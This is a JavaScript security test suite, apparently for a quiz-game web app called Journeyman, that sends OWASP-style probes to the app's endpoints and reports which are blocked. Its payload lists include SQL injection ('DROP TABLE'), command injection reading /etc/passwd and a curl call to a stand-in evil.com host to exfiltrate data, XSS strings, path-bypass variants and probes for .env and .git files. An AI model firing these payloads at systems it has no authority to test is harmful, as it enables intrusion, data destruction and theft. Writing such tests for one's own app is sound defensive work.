// journeyman/security-tests/penetration-tests.js
// Comprehensive security testing suite for OWASP compliance

const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class SecurityTester {
  constructor(baseUrl, options = {}) {
    this.baseUrl = baseUrl;
    this.options = {
      timeout: options.timeout || 10000,
      maxRetries: options.maxRetries || 3,
      verbose: options.verbose || false,
      outputFile: options.outputFile || null,
      ...options
    };

    this.results = {
      passed: [],
      failed: [],
      warnings: [],
      critical: [],
      info: []
    };

    this.testStartTime = Date.now();
    this.axiosInstance = axios.create({
      timeout: this.options.timeout,
      validateStatus: () => true, // Don't throw on HTTP error status
      headers: {
        'User-Agent': 'Journeyman-SecurityTester/1.0.0'
      }
    });
  }

  log(level, message) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] [${level.toUpperCase()}] ${message}`;

    if (this.options.verbose || level === 'ERROR' || level === 'CRITICAL') {
      console.log(logMessage);
    }

    this.results.info.push(logMessage);
  }

  // OWASP A01:2021 - Broken Access Control Tests
  async testAccessControl() {
    this.log('info', '🔒 Testing Access Control...');

    const tests = [
      this.testUnauthorizedAccess(),
      this.testDirectObjectReference(),
      this.testPrivilegeEscalation(),
      this.testBypassAuthenticationChecks(),
      this.testForcedBrowsing(),
      this.testMethodOverride()
    ];

    await Promise.allSettled(tests);
  }

  async testUnauthorizedAccess() {
    try {
      // Test accessing admin endpoints without authentication
      const response = await this.axiosInstance.get(`${this.baseUrl}/admin/security-logs`);

      if (response.status === 401 || response.status === 403) {
        this.results.passed.push('✅ Admin endpoints properly protected');
      } else {
        this.results.failed.push('❌ Admin endpoints accessible without authentication');
        this.results.critical.push('CRITICAL: Admin endpoints exposed without authentication');
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Admin endpoint test failed: ${error.message}`);
    }
  }

  async testDirectObjectReference() {
    try {
      // Test accessing other users' data
      const response = await this.axiosInstance.get(`${this.baseUrl}/analytics/journeyman`);

      if (response.status === 401 || response.status === 403) {
        this.results.passed.push('✅ Analytics endpoint requires authentication');
      } else {
        this.results.failed.push('❌ Analytics endpoint accessible without API key');
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Direct object reference test failed: ${error.message}`);
    }
  }

  async testPrivilegeEscalation() {
    // Test role-based access control
    const normalUserToken = 'fake-normal-user-token';

    try {
      const response = await this.axiosInstance.get(`${this.baseUrl}/admin/security-logs`, {
        headers: {
          'Authorization': `Bearer ${normalUserToken}`,
          'X-API-Key': normalUserToken
        }
      });

      if (response.status === 401 || response.status === 403) {
        this.results.passed.push('✅ Role-based access control working');
      } else {
        this.results.failed.push('❌ Privilege escalation possible');
        this.results.critical.push('CRITICAL: Privilege escalation vulnerability detected');
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Privilege escalation test failed: ${error.message}`);
    }
  }

  async testBypassAuthenticationChecks() {
    const bypassAttempts = [
      '/admin/../analytics',
      '/admin/%2e%2e/analytics',
      '/admin/security-logs?user=admin',
      '/admin/security-logs#admin',
      '/admin/security-logs/../health',
      '/admin;/analytics',
      '/admin%00/security-logs',
      '/admin/./security-logs'
    ];

    for (const attempt of bypassAttempts) {
      try {
        const response = await this.axiosInstance.get(`${this.baseUrl}${attempt}`);

        if (response.status === 401 || response.status === 403 || response.status === 404) {
          this.results.passed.push(`✅ Bypass attempt blocked: ${attempt}`);
        } else {
          this.results.failed.push(`❌ Bypass attempt successful: ${attempt}`);
          this.results.critical.push(`CRITICAL: Authentication bypass possible via: ${attempt}`);
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ Bypass test failed for ${attempt}: ${error.message}`);
      }
    }
  }

  async testForcedBrowsing() {
    const sensitiveFiles = [
      '/.env',
      '/config.json',
      '/package.json',
      '/admin/',
      '/backup/',
      '/logs/',
      '/.git/config',
      '/server.js',
      '/database.sql'
    ];

    for (const file of sensitiveFiles) {
      try {
        const response = await this.axiosInstance.get(`${this.baseUrl}${file}`);

        if (response.status === 401 || response.status === 403 || response.status === 404) {
          this.results.passed.push(`✅ Sensitive file protected: ${file}`);
        } else if (response.status === 200) {
          this.results.failed.push(`❌ Sensitive file exposed: ${file}`);
          this.results.critical.push(`CRITICAL: Sensitive file accessible: ${file}`);
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ Forced browsing test failed for ${file}: ${error.message}`);
      }
    }
  }

  async testMethodOverride() {
    const methods = ['PUT', 'DELETE', 'PATCH'];

    for (const method of methods) {
      try {
        const response = await this.axiosInstance({
          method,
          url: `${this.baseUrl}/save-player`,
          data: { name: 'Test', email: 'test@example.com' }
        });

        if (response.status === 405 || response.status === 401 || response.status === 403) {
          this.results.passed.push(`✅ ${method} method properly restricted`);
        } else if (response.status === 200) {
          this.results.failed.push(`❌ ${method} method unexpectedly allowed`);
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ Method override test failed for ${method}: ${error.message}`);
      }
    }
  }

  // OWASP A02:2021 - Cryptographic Failures Tests
  async testCryptographicFailures() {
    this.log('info', '🔐 Testing Cryptographic Implementation...');

    await Promise.allSettled([
      this.testHTTPSRedirection(),
      this.testTLSConfiguration(),
      this.testSensitiveDataTransmission(),
      this.testCookiesSecurity(),
      this.testPasswordStorage()
    ]);
  }

  async testHTTPSRedirection() {
    try {
      const httpUrl = this.baseUrl.replace('https://', 'http://');
      const response = await this.axiosInstance.get(httpUrl, {
        maxRedirects: 0
      });

      if (response.status === 301 || response.status === 302) {
        const location = response.headers.location;
        if (location && location.startsWith('https://')) {
          this.results.passed.push('✅ HTTP to HTTPS redirection working');
        } else {
          this.results.failed.push('❌ HTTP redirects but not to HTTPS');
        }
      } else if (this.baseUrl.startsWith('https://')) {
        this.results.warnings.push('⚠️ HTTPS redirection not configured (but using HTTPS)');
      } else {
        this.results.failed.push('❌ HTTP to HTTPS redirection not configured');
      }
    } catch (error) {
      if (error.code === 'ECONNREFUSED') {
        this.results.warnings.push('⚠️ HTTP port not available (good for security)');
      } else {
        this.results.warnings.push(`⚠️ HTTPS redirection test failed: ${error.message}`);
      }
    }
  }

  async testTLSConfiguration() {
    try {
      const response = await this.axiosInstance.get(`${this.baseUrl}/health`);

      // Check if using HTTPS
      if (this.baseUrl.startsWith('https://')) {
        this.results.passed.push('✅ HTTPS properly configured');

        // Check security headers
        const hstsHeader = response.headers['strict-transport-security'];
        if (hstsHeader) {
          this.results.passed.push('✅ HSTS header present');
        } else {
          this.results.failed.push('❌ HSTS header missing');
        }
      } else {
        this.results.failed.push('❌ HTTPS not configured');
        this.results.critical.push('CRITICAL: Application not using HTTPS');
      }
    } catch (error) {
      this.results.failed.push(`❌ TLS configuration test failed: ${error.message}`);
    }
  }

  async testSensitiveDataTransmission() {
    try {
      const sensitiveData = {
        name: 'Test User',
        email: 'test@example.com',
        password: 'testpassword123',
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111'
      };

      const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, sensitiveData);

      // Check if sensitive fields are properly rejected
      if (response.status === 400) {
        const errorMessage = response.data?.error || '';
        if (errorMessage.toLowerCase().includes('password') ||
            errorMessage.toLowerCase().includes('sensitive')) {
          this.results.passed.push('✅ Sensitive data properly rejected');
        } else {
          this.results.warnings.push('⚠️ Request rejected but unclear if due to sensitive data');
        }
      } else {
        this.results.warnings.push('⚠️ Check if sensitive data is properly handled');
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Sensitive data test failed: ${error.message}`);
    }
  }

  async testCookiesSecurity() {
    try {
      const response = await this.axiosInstance.get(`${this.baseUrl}/health`);
      const cookies = response.headers['set-cookie'];

      if (cookies) {
        cookies.forEach(cookie => {
          const hasSecure = cookie.toLowerCase().includes('secure');
          const hasHttpOnly = cookie.toLowerCase().includes('httponly');
          const hasSameSite = cookie.toLowerCase().includes('samesite');

          if (hasSecure && hasHttpOnly && hasSameSite) {
            this.results.passed.push('✅ Cookie security flags properly set');
          } else {
            const missing = [];
            if (!hasSecure) missing.push('Secure');
            if (!hasHttpOnly) missing.push('HttpOnly');
            if (!hasSameSite) missing.push('SameSite');
            this.results.failed.push(`❌ Cookie missing security flags: ${missing.join(', ')}`);
          }
        });
      } else {
        this.results.info.push('ℹ️ No cookies detected in response');
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Cookie security test failed: ${error.message}`);
    }
  }

  async testPasswordStorage() {
    // This test checks if password hashes are exposed
    try {
      const response = await this.axiosInstance.get(`${this.baseUrl}/leaderboard/journeyman`);

      if (response.status === 200 && response.data) {
        const dataString = JSON.stringify(response.data);
        const suspiciousPatterns = [
          /\$2[aby]\$\d+\$/,  // bcrypt hashes
          /[a-f0-9]{32,64}/,  // MD5/SHA hashes
          /password/i,
          /hash/i
        ];

        let foundSuspicious = false;
        suspiciousPatterns.forEach(pattern => {
          if (pattern.test(dataString)) {
            foundSuspicious = true;
          }
        });

        if (foundSuspicious) {
          this.results.failed.push('❌ Potential password hashes exposed in API response');
          this.results.critical.push('CRITICAL: Password hashes may be exposed');
        } else {
          this.results.passed.push('✅ No obvious password hashes in API responses');
        }
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Password storage test failed: ${error.message}`);
    }
  }

  // OWASP A03:2021 - Injection Tests
  async testInjectionAttacks() {
    this.log('info', '💉 Testing Injection Vulnerabilities...');

    await Promise.allSettled([
      this.testSQLInjection(),
      this.testNoSQLInjection(),
      this.testXSSInjection(),
      this.testCommandInjection(),
      this.testLDAPInjection(),
      this.testHeaderInjection()
    ]);
  }

  async testSQLInjection() {
    const sqlPayloads = [
      "'; DROP TABLE players; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "' OR 1=1 #",
      "'; SELECT * FROM information_schema.tables; --",
      "' AND SLEEP(5) --",
      "' OR pg_sleep(5) --"
    ];

    for (const payload of sqlPayloads) {
      try {
        const startTime = Date.now();
        const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, {
          name: payload,
          email: 'test@example.com'
        });
        const endTime = Date.now();
        const duration = endTime - startTime;

        if (response.status === 400) {
          this.results.passed.push(`✅ SQL injection blocked: ${payload.substring(0, 20)}...`);
        } else if (duration > 4000) {
          this.results.failed.push(`❌ SQL injection may cause time delays: ${payload.substring(0, 20)}...`);
          this.results.critical.push('CRITICAL: SQL injection vulnerability detected (time-based)');
        } else if (response.status === 200) {
          this.results.failed.push(`❌ SQL injection possible: ${payload.substring(0, 20)}...`);
          this.results.critical.push('CRITICAL: SQL injection vulnerability detected');
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ SQL injection test failed: ${error.message}`);
      }
    }
  }

  async testNoSQLInjection() {
    const noSQLPayloads = [
      { "$ne": null },
      { "$gt": "" },
      { "$where": "function() { return true; }" },
      { "$regex": ".*" },
      { "$or": [{"name": {"$ne": null}}, {"email": {"$ne": null}}] }
    ];

    for (const payload of noSQLPayloads) {
      try {
        const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, {
          name: payload,
          email: 'test@example.com'
        });

        if (response.status === 400) {
          this.results.passed.push(`✅ NoSQL injection blocked`);
        } else if (response.status === 200) {
          this.results.failed.push(`❌ NoSQL injection possible`);
          this.results.critical.push('CRITICAL: NoSQL injection vulnerability detected');
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ NoSQL injection test failed: ${error.message}`);
      }
    }
  }

  async testXSSInjection() {
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "javascript:alert('XSS')",
      "<img src=x onerror=alert('XSS')>",
      "';alert('XSS');//",
      "<svg onload=alert('XSS')>",
      "{{7*7}}",
      "${7*7}",
      "<iframe src=javascript:alert('XSS')></iframe>",
      "<body onload=alert('XSS')>",
      "<<SCRIPT>alert('XSS')<</SCRIPT>"
    ];

    for (const payload of xssPayloads) {
      try {
        const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, {
          name: payload,
          email: 'test@example.com'
        });

        if (response.status === 400) {
          this.results.passed.push(`✅ XSS injection blocked: ${payload.substring(0, 20)}...`);
        } else if (response.status === 200) {
          // Check if payload is reflected in response
          const responseText = JSON.stringify(response.data);
          if (responseText.includes(payload)) {
            this.results.failed.push(`❌ XSS injection possible (reflected): ${payload.substring(0, 20)}...`);
            this.results.critical.push('CRITICAL: XSS vulnerability detected');
          } else {
            this.results.passed.push(`✅ XSS payload not reflected: ${payload.substring(0, 20)}...`);
          }
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ XSS injection test failed: ${error.message}`);
      }
    }
  }

  async testCommandInjection() {
    const commandPayloads = [
      "; ls -la",
      "| cat /etc/passwd",
      "&& whoami",
      "`id`",
      "$(id)",
      "; ping -c 4 127.0.0.1",
      "|| curl http://evil.com/steal?data=",
      "; sleep 5"
    ];

    for (const payload of commandPayloads) {
      try {
        const startTime = Date.now();
        const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, {
          name: payload,
          email: 'test@example.com'
        });
        const endTime = Date.now();
        const duration = endTime - startTime;

        if (response.status === 400) {
          this.results.passed.push(`✅ Command injection blocked: ${payload}`);
        } else if (duration > 4000) {
          this.results.failed.push(`❌ Command injection may cause time delays: ${payload}`);
          this.results.critical.push('CRITICAL: Command injection vulnerability detected (time-based)');
        } else if (response.status === 200) {
          this.results.failed.push(`❌ Command injection possible: ${payload}`);
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ Command injection test failed: ${error.message}`);
      }
    }
  }

  async testLDAPInjection() {
    const ldapPayloads = [
      "*)(uid=*))(|(uid=*",
      "*)(|(password=*))",
      "admin)(&(password=*)",
      "*))%00"
    ];

    for (const payload of ldapPayloads) {
      try {
        const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, {
          name: payload,
          email: 'test@example.com'
        });

        if (response.status === 400) {
          this.results.passed.push(`✅ LDAP injection blocked: ${payload}`);
        } else if (response.status === 200) {
          this.results.warnings.push(`⚠️ Check LDAP injection: ${payload}`);
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ LDAP injection test failed: ${error.message}`);
      }
    }
  }

  async testHeaderInjection() {
    const headerPayloads = [
      "\r\nSet-Cookie: malicious=true",
      "\n\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
      "\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK"
    ];

    for (const payload of headerPayloads) {
      try {
        const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, {
          name: 'Test User',
          email: 'test@example.com'
        }, {
          headers: {
            'Custom-Header': payload
          }
        });

        // Check if malicious headers are reflected
        const responseHeaders = JSON.stringify(response.headers);
        if (responseHeaders.includes('malicious') || responseHeaders.includes('<script>')) {
          this.results.failed.push(`❌ Header injection possible`);
          this.results.critical.push('CRITICAL: HTTP header injection vulnerability detected');
        } else {
          this.results.passed.push(`✅ Header injection blocked`);
        }
      } catch (error) {
        this.results.warnings.push(`⚠️ Header injection test failed: ${error.message}`);
      }
    }
  }

  // OWASP A04:2021 - Insecure Design Tests
  async testInsecureDesign() {
    this.log('info', '🏗️ Testing Secure Design Patterns...');

    await Promise.allSettled([
      this.testRateLimiting(),
      this.testBusinessLogicFlaws(),
      this.testSecurityControls(),
      this.testResourceExhaustion(),
      this.testSequentialAttacks()
    ]);
  }

  async testRateLimiting() {
    try {
      const requests = [];
      const testCount = 25; // More aggressive test

      // Send rapid requests
      for (let i = 0; i < testCount; i++) {
        requests.push(
          this.axiosInstance.post(`${this.baseUrl}/save-player`, {
            name: `Test User ${i}`,
            email: `test${i}@example.com`
          })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(response => response.status === 429).length;
      const successful = responses.filter(response => response.status === 200).length;

      if (rateLimited > 0) {
        this.results.passed.push(`✅ Rate limiting working (${rateLimited}/${testCount} requests blocked)`);
      } else if (successful === testCount) {
        this.results.failed.push(`❌ Rate limiting not working (${successful}/${testCount} requests succeeded)`);
      } else {
        this.results.warnings.push(`⚠️ Rate limiting unclear (${successful} successful, ${rateLimited} blocked)`);
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Rate limiting test failed: ${error.message}`);
    }
  }

  async testBusinessLogicFlaws() {
    try {
      // Test invalid game data
      const invalidDataTests = [
        { name: 'Test User', email: 'test@example.com', correctCount: -1, test: 'negative score' },
        { name: 'Test User', email: 'test@example.com', correctCount: 999999, test: 'impossibly high score' },
        { name: 'Test User', email: 'test@example.com', durationInSeconds: -100, test: 'negative time' },
        { name: 'Test User', email: 'test@example.com', durationInSeconds: 0, test: 'zero time' },
        { name: '', email: 'test@example.com', test: 'empty name' },
        { name: 'Test User', email: '', test: 'empty email' },
        { name: 'Test User', email: 'invalid-email', test: 'invalid email format' }
      ];

      let validationPassed = 0;
      let validationFailed = 0;

      for (const testData of invalidDataTests) {
        try {
          const { test, ...data } = testData;
          const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, data);

          if (response.status === 400) {
            validationPassed++;
            this.log('debug', `✅ Business logic validation working: ${test}`);
          } else {
            validationFailed++;
            this.log('debug', `❌ Business logic validation failed: ${test}`);
          }
        } catch (error) {
          this.results.warnings.push(`⚠️ Business logic test failed for ${testData.test}: ${error.message}`);
        }
      }

      if (validationFailed === 0) {
        this.results.passed.push(`✅ Business logic validation working (${validationPassed}/${invalidDataTests.length} tests)`);
      } else {
        this.results.failed.push(`❌ Business logic validation issues (${validationFailed}/${invalidDataTests.length} failed)`);
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Business logic test failed: ${error.message}`);
    }
  }

  async testSecurityControls() {
    try {
      // Check for security headers
      const response = await this.axiosInstance.get(`${this.baseUrl}/health`);

      const requiredSecurityHeaders = {
        'content-security-policy': 'CSP',
        'x-content-type-options': 'X-Content-Type-Options',
        'x-frame-options': 'X-Frame-Options',
        'strict-transport-security': 'HSTS',
        'x-xss-protection': 'X-XSS-Protection',
        'referrer-policy': 'Referrer-Policy'
      };

      const missingHeaders = [];
      const presentHeaders = [];

      for (const [header, description] of Object.entries(requiredSecurityHeaders)) {
        if (response.headers[header]) {
          presentHeaders.push(description);
        } else {
          missingHeaders.push(description);
        }
      }

      if (missingHeaders.length === 0) {
        this.results.passed.push(`✅ All security headers configured: ${presentHeaders.join(', ')}`);
      } else {
        this.results.failed.push(`❌ Missing security headers: ${missingHeaders.join(', ')}`);

        if (missingHeaders.includes('CSP')) {
          this.results.critical.push('CRITICAL: Content Security Policy header missing');
        }
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Security controls test failed: ${error.message}`);
    }
  }

  async testResourceExhaustion() {
    try {
      // Test with large payload
      const largeData = {
        name: 'A'.repeat(10000),
        email: 'test@example.com',
        gameType: 'journeyman',
        guesses: Array(1000).fill('Large guess data'.repeat(100))
      };

      const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, largeData);

      if (response.status === 400 || response.status === 413) {
        this.results.passed.push('✅ Large payload rejected (DoS protection)');
      } else if (response.status === 200) {
        this.results.failed.push('❌ Large payload accepted (potential DoS vulnerability)');
      }
    } catch (error) {
      if (error.code === 'ECONNRESET' || error.message.includes('timeout')) {
        this.results.failed.push('❌ Server overwhelmed by large payload');
      } else {
        this.results.warnings.push(`⚠️ Resource exhaustion test failed: ${error.message}`);
      }
    }
  }

  async testSequentialAttacks() {
    try {
      // Test multiple attack vectors in sequence
      const attackSequence = [
        { payload: '<script>alert("xss")</script>', type: 'XSS' },
        { payload: "'; DROP TABLE players; --", type: 'SQL Injection' },
        { payload: '../../../etc/passwd', type: 'Path Traversal' },
        { payload: '${7*7}', type: 'Template Injection' }
      ];

      let blockedCount = 0;

      for (const attack of attackSequence) {
        const response = await this.axiosInstance.post(`${this.baseUrl}/save-player`, {
          name: attack.payload,
          email: 'test@example.com'
        });

        if (response.status === 400) {
          blockedCount++;
        }
      }

      if (blockedCount === attackSequence.length) {
        this.results.passed.push('✅ Sequential attack vectors blocked');
      } else {
        this.results.failed.push(`❌ Some attack vectors not blocked (${blockedCount}/${attackSequence.length})`);
      }
    } catch (error) {
      this.results.warnings.push(`⚠️ Sequential attacks test failed: ${error.message}`);
    }
  }

  // Generate comprehensive report
  generateReport() {
    const testDuration = Date.now() - this.testStartTime;
    const totalTests = this.results.passed.length + this.results.failed.length + this.results.warnings.length;

    const report = {
      summary: {
        testStartTime: new Date(this.testStartTime).toISOString(),
        testDuration: `${(testDuration / 1000).toFixed(2)}s`,
        totalTests,
        passed: this.results.passed.length,
        failed: this.results.failed.length,
        warnings: this.results.warnings.length,
        critical: this.results.critical.length,
        riskLevel: this.calculateRiskLevel()
      },
      details: {
        passed: this.results.passed,
        failed: this.results.failed,
        warnings: this.results.warnings,
        critical: this.results.critical
      },
      recommendations: this.generateRecommendations()
    };

    return report;
  }

  calculateRiskLevel() {
    if (this.results.critical.length > 0) return 'CRITICAL';
    if (this.results.failed.length > 5) return 'HIGH';
    if (this.results.failed.length > 2) return 'MEDIUM';
    if (this.results.failed.length > 0) return 'LOW';
    return 'MINIMAL';
  }

  generateRecommendations() {
    const recommendations = [];

    if (this.results.critical.length > 0) {
      recommendations.push('🚨 IMMEDIATE ACTION REQUIRED: Critical vulnerabilities detected');
    }

    if (this.results.failed.some(f => f.includes('HTTPS'))) {
      recommendations.push('🔒 Enable HTTPS/TLS encryption for all communications');
    }

    if (this.results.failed.some(f => f.includes('injection'))) {
      recommendations.push('💉 Implement proper input validation and parameterized queries');
    }

    if (this.results.failed.some(f => f.includes('rate limit'))) {
      recommendations.push('⚡ Implement rate limiting to prevent abuse');
    }

    if (this.results.failed.some(f => f.includes('header'))) {
      recommendations.push('🛡️ Configure security headers (CSP, HSTS, etc.)');
    }

    if (this.results.failed.some(f => f.includes('authentication'))) {
      recommendations.push('🔑 Strengthen authentication and access controls');
    }

    recommendations.push('🔄 Schedule regular security testing and monitoring');
    recommendations.push('📚 Review OWASP Top 10 guidelines');

    return recommendations;
  }

  // Print results to console
  printResults() {
    const report = this.generateReport();

    console.log('\n' + '='.repeat(80));
    console.log('🔍 JOURNEYMAN SECURITY TEST RESULTS');
    console.log('='.repeat(80));

    console.log(`\n📊 TEST SUMMARY:`);
    console.log(`   Duration: ${report.summary.testDuration}`);
    console.log(`   Total Tests: ${report.summary.totalTests}`);
    console.log(`   ✅ Passed: ${report.summary.passed}`);
    console.log(`   ❌ Failed: ${report.summary.failed}`);
    console.log(`   ⚠️  Warnings: ${report.summary.warnings}`);
    console.log(`   🚨 Critical: ${report.summary.critical}`);
    console.log(`   🎯 Risk Level: ${report.summary.riskLevel}`);

    if (report.details.critical.length > 0) {
      console.log(`\n🚨 CRITICAL VULNERABILITIES:`);
      report.details.critical.forEach(item => console.log(`   ${item}`));
    }

    if (report.details.failed.length > 0) {
      console.log(`\n❌ FAILED TESTS:`);
      report.details.failed.forEach(item => console.log(`   ${item}`));
    }

    if (report.details.warnings.length > 0) {
      console.log(`\n⚠️  WARNINGS:`);
      report.details.warnings.slice(0, 10).forEach(item => console.log(`   ${item}`));
      if (report.details.warnings.length > 10) {
        console.log(`   ... and ${report.details.warnings.length - 10} more`);
      }
    }

    console.log(`\n💡 RECOMMENDATIONS:`);
    report.recommendations.forEach(item => console.log(`   ${item}`));

    console.log('\n' + '='.repeat(80));
    console.log(`Report generated: ${new Date().toISOString()}`);
    console.log('='.repeat(80));

    // Save to file if specified
    if (this.options.outputFile) {
      this.saveReport(report);
    }

    return report;
  }

  saveReport(report) {
    try {
      const filename = this.options.outputFile || `security-report-${Date.now()}.json`;
      fs.writeFileSync(filename, JSON.stringify(report, null, 2));
      console.log(`\n📁 Report saved to: ${filename}`);
    } catch (error) {
      console.error(`❌ Failed to save report: ${error.message}`);
    }
  }

  // Run all tests
  async runAllTests() {
    this.log('info', '🚀 Starting comprehensive security tests...');

    await this.testAccessControl();
    await this.testCryptographicFailures();
    await this.testInjectionAttacks();
    await this.testInsecureDesign();

    return this.printResults();
  }
}

// Command line usage
async function main() {
  const args = process.argv.slice(2);
  const baseUrl = args[0] || 'http://localhost:3001';
  const outputFile = args[1];

  console.log(`🎯 Testing security for: ${baseUrl}`);

  const tester = new SecurityTester(baseUrl, {
    verbose: true,
    outputFile: outputFile,
    timeout: 15000
  });

  try {
    await tester.runAllTests();

    // Exit with error code if critical issues found
    const report = tester.generateReport();
    if (report.summary.critical > 0) {
      process.exit(1);
    } else if (report.summary.failed > 5) {
      process.exit(2);
    }

  } catch (error) {
    console.error(`❌ Security testing failed: ${error.message}`);
    process.exit(3);
  }
}

// Export for use as module
module.exports = SecurityTester;

// Run if called directly
if (require.main === module) {
  main().catch(console.error);
}
